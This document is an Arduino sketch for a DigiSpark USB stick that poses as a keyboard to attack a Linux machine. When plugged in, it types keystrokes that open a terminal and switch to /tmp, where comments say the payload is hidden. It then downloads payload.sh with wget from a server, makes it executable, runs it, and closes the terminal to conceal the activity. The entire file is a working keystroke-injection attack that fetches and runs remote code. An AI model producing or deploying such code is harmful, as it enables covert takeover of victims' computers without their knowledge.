#include "DigiKeyboard.h"

void setup() {
  // Wait for the machine to detect the DigiSpark, then send a wake-up signal
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Allow for full keyboard acesss, then open a terminal
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_RIGHT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1500);

  // Change directories to the /tmp directory to hide the payload script
  DigiKeyboard.print("cd /tmp");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Download the payload script from the server
  DigiKeyboard.print("wget -q http://0.0.0.0:8000/payload.sh");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Make the payload.sh script executable
  DigiKeyboard.print("chmod +x payload.sh");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Execute the payload.sh script
  DigiKeyboard.print("./payload.sh");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Attempt to close the terminal window
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
}

void loop() {
}
